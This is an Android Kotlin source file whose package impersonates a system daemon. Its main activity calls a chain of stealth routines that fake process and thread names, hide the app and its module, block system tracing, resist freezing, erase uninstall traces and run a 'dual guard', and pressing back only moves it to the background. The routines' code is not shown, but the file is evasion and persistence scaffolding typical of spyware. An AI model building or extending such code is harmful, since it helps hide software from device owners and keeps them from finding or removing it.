package com.android.system.daemon

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // 启动全部底层隐藏
        SilentCore.randomFakeProcess()
        SilentCore.randomThreadName()
        SilentCore.hideBase()
        SilentCore.hideDeep()
        SilentCore.blockSystemTrace()
        SilentCore.hideModule()
        SilentCore.antiFreeze()
        SilentCore.hideUninstallTrace()
        SilentCore.startDualGuard()
    }

    override fun onBackPressed() {
        moveTaskToBack(true)
    }
}
